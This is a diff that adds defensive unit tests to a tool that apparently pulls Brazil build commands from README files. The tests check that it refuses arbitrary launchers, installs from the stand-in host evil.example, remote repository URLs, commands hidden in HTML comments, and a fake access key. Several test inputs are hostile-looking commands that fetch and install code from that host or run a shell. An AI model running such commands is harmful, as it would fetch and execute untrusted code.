@@ -117,3 +117,54 @@ describe("the language tool keeps running inside a Brazil package", () => {
     expect(documented.notes.join(" ")).toContain("Brazil wraps the language tool");
   });
 });
+
+describe("fix round 1: Brazil launchers, negation, comments, secrets and package sources", () => {
+  const fenced = (...commands: string[]): string => doc("## Tests", "```", ...commands, "```");
+  it("proposes only brazil-build, and brazil-recursive-cmd running brazil-build: launchers that run any program are refused", async () => {
+    for (const command of [
+      "brazil-runtime-exec /bin/bash -c id",
+      "brazil-recursive-cmd --allPackages python3 -mhttp.server",
+      "brazil-runtime-exec pip install https://evil.example/x.tar.gz",
+      "brazil-runtime-exec /usr/bin/env python3 -mpip install git+https://evil.example/p",
+      "brazil-test-exec pytest",
+    ]) {
+      const detection = await detect({ Config: CONFIG, "README.md": fenced(command) });
+      expect(detection.checks, command).toEqual([]);
+      expect(detection.questions, command).toHaveLength(1);
+    }
+    const allowed = await detect({ Config: CONFIG, "README.md": fenced("brazil-recursive-cmd --allPackages brazil-build unit-tests") });
+    expect(byId(allowed, "brazil-test")?.value.command).toMatchObject({ executable: "brazil-recursive-cmd", args: ["--allPackages", "brazil-build", "unit-tests"] });
+  });
+  it("refuses an argument that names a URL or a git source, even on brazil-build", async () => {
+    for (const command of ["brazil-build test https://evil.example/x", "brazil-build -Dmaven.repo.remote=http://evil.example/repo release", "brazil-build test git+ssh", "brazil-build --index-url=https://evil.example/simple test"]) {
+      expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
+    }
+  });
+  it("skips a fenced block when the prose just before it says not to run it", async () => {
+    for (const lead of ["Never run this, it wipes your workspace:", "Do not run this on a laptop.", "Avoid this one:"]) {
+      const detection = await detect({ Config: CONFIG, "README.md": doc("## Tests", lead, "", "```", "brazil-build test", "```") });
+      expect(detection.checks, lead).toEqual([]);
+    }
+    const wiped = await detect({ Config: CONFIG, "README.md": doc("## Tests", "Never run this, it wipes your workspace:", "```", "brazil-package-cache clean", "```") });
+    expect(wiped.checks).toEqual([]);
+    const clean = await detect({ Config: CONFIG, "README.md": fenced("brazil-build clean", "brazil-build wipe-all") });
+    expect(clean.checks).toEqual([]);
+    const positive = await detect({ Config: CONFIG, "README.md": doc("## Tests", "Run this:", "", "```", "brazil-build test", "```") });
+    expect(byId(positive, "brazil-test")).toBeDefined();
+  });
+  it("does not read HTML comments", async () => {
+    const detection = await detect({ Config: CONFIG, "README.md": doc("# Service", "<!--", "## Tests", "```", "brazil-build test", "```", "-->", "`brazil-build release` is hidden too <!-- `brazil-build test` -->") });
+    expect(detection.checks).toEqual([]);
+    const visible = await detect({ Config: CONFIG, "README.md": doc("<!-- note -->", "## Tests", "```", "brazil-build test", "```") });
+    expect(byId(visible, "brazil-test")?.source).toEqual({ path: "README.md", line: 4 });
+  });
+  it("refuses an argument that carries a secret, and never prints it", async () => {
+    // Built at runtime so no key-shaped literal sits in the source.
+    const fakeKey = `AKIA${"ABCDEFGHIJKLMNOP"}`;
+    const detection = await detect({ Config: CONFIG, "README.md": doc("## Tests", "`brazil-build test`", "", "Also `brazil-build", `-Dtoken=${fakeKey} release\`.`, `\`brazil-build -Dtoken=${fakeKey} release\``) });
+    expect(byId(detection, "brazil-test")?.value.command.args).toEqual(["test"]);
+    expect(JSON.stringify(detection)).not.toContain(fakeKey);
+    const only = await detect({ Config: CONFIG, "README.md": doc("## Tests", `\`brazil-build -Dtoken=${fakeKey} release\``) });
+    expect(only.checks).toEqual([]);
+  });
+});
